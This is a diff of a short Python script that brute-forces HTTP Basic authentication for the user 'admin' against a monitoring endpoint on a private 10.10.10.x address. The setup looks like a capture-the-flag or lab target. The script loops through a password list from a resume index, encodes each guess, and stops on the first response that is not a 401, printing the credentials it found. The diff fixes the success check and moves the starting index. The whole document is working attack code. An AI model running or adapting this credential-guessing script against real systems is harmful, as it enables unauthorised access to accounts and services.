@@ -17,14 +17,14 @@ headers = {
     'Upgrade-Insecure-Requests': '1',
     'Authorization': 'Basic unknown'
 }
-x=4000
+x=15539
 for password in passwords[x:]:
     auth = "admin:" + password
     base64pass = base64.b64encode(auth.encode('utf-8'))
     headers['Authorization'] = "Basic " + str(base64pass, 'utf8') 
     print(str(x) + ": " + headers['Authorization'])
     response = requests.get('http://10.10.10.157/monitoring', headers=headers)
-    if response.text.find('401') == -1:
+    if response.status_code != 401:
         print("Credentials are: " + "admin:" + password)
         print(response.text)
         break
